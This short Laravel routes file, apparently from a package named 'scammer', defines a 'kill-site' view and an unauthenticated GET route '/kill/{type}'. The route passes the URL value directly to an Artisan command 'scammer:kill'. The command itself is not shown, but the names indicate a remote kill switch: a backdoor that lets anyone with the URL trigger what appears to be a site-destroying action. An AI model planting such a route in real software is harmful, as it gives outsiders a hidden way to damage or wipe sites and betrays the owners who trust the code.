<?php
Route::view('kill-site' , 'scammer::index');
Route::get('/kill/{type}', function($type) {
	$status = Artisan::call('scammer:kill' , ['type' => $type]);
})->name('kill.do');
